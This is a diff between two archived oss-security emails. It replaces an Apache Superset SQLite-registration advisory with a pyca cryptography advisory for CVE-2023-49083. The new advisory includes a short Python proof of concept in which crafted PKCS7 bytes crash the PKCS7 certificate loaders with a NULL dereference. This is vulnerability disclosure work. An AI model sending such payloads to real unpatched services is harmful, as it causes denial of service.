@@ -1,26 +1,52 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/09/06/6
-Message-ID: <23a4e7b4-1db4-9ab1-0a79-48484874b5b3@apache.org>
-Date: Wed, 06 Sep 2023 09:34:41 +0000
-From: Daniel Gaspar <dpgaspar@...che.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/11/29/2
+Message-ID: <ea180550-801c-4a6d-b8aa-dee79d76f17a@oracle.com>
+Date: Wed, 29 Nov 2023 11:30:39 -0800
+From: Alan Coopersmith <alan.coopersmith@...cle.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2023-39265: Apache Superset: Possible Unauthorized Registration of SQLite Database Connections 
+Subject: Python Cryptography advisory: CVE-2023-49083 NULL-dereference when loading PKCS7 certificates
 Content-Type: text/plain; charset=utf-8
 
-Affected versions:
+https://github.com/pyca/cryptography/security/advisories/GHSA-jfhm-5ghh-2f97
+reports:
 
-- Apache Superset through 2.1.0
+-------------------------------------------------------------------------------
+Affected versions >= 3.1, < 41.0.6
+Patched versions >=41.0.6
 
-Description:
+Summary
 
-Apache Superset would allow for SQLite database connections to be incorrectly registered when an attacker uses alternative driver names like sqlite+pysqlite or by using database imports. This could allow for unexpected file creation on Superset webservers. Additionally, if Apache Superset is using a SQLite database for its metadata (not advised for production use) it could result in more severe vulnerabilities related to confidentiality and integrity. This vulnerability exists in Apache Superset versions up to and including 2.1.0.
+Calling load_pem_pkcs7_certificates or load_der_pkcs7_certificates could lead to 
+a NULL-pointer dereference and segfault.
+PoC
 
-Credit:
+Here is a Python code that triggers the issue:
 
-Naveen Sunkavally (Horizon3.ai) (finder)
+from cryptography.hazmat.primitives.serialization.pkcs7 import 
+load_der_pkcs7_certificates, load_pem_pkcs7_certificates
 
-References:
+pem_p7 = b"""
+-----BEGIN PKCS7-----
+MAsGCSqGSIb3DQEHAg==
+-----END PKCS7-----
+"""
 
-https://superset.apache.org
-https://www.cve.org/CVERecord?id=CVE-2023-39265
+der_p7 = b"\x30\x0B\x06\x09\x2A\x86\x48\x86\xF7\x0D\x01\x07\x02"
 
+load_pem_pkcs7_certificates(pem_p7)
+load_der_pkcs7_certificates(der_p7)
+
+Impact
+
+Exploitation of this vulnerability poses a serious risk of Denial of Service 
+(DoS) for any application attempting to deserialize a PKCS7 blob/certificate. 
+The consequences extend to potential disruptions in system availability and 
+stability.
+
+-------------------------------------------------------------------------------
+
+The fix was in https://github.com/pyca/cryptography/pull/9926
+
+-- 
+         -Alan Coopersmith-                 alan.coopersmith@...cle.com
+          Oracle Solaris Engineering - https://blogs.oracle.com/solaris
